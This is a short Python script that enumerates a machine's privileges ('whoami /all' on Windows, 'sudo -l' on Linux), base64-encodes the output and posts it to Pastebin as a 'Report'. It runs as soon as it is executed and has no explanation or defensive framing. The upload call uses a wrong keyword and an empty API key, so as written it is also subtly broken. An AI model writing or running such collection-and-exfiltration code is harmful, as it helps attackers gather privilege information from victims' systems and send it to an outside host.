import requests
import subprocess
import os
import base64


def wind():
    report = []
    x = subprocess.Popen("whoami /all", stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    str, sterr = x.communicate()
    if sterr != b'':
        report.append(sterr.decode())
    else:
        report.append(str.decode())
    report = "\n".join(report)
    upload(base64.b64encode(report.encode()))


def linux():
    report = []
    x = subprocess.Popen("sudo -l", stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    str, sterr = x.communicate()
    if sterr != b'':
        report.append(sterr.decode())
    else:
        report.append(str.decode())
    report = "\n".join(report)
    upload(base64.b64encode(report.encode()))


def upload(res):
    url = 'https://pastebin.com/api/api_post.php'
    api = {'api_dev_key': "",
           'api_option': "paste",
           'api_paste_code': res,
           'api_paste_name': "Report"
           }
    send = requests.post(url, report=api)


def main():
    if os.name == "nt":
        wind()
    else:
        linux()


main()
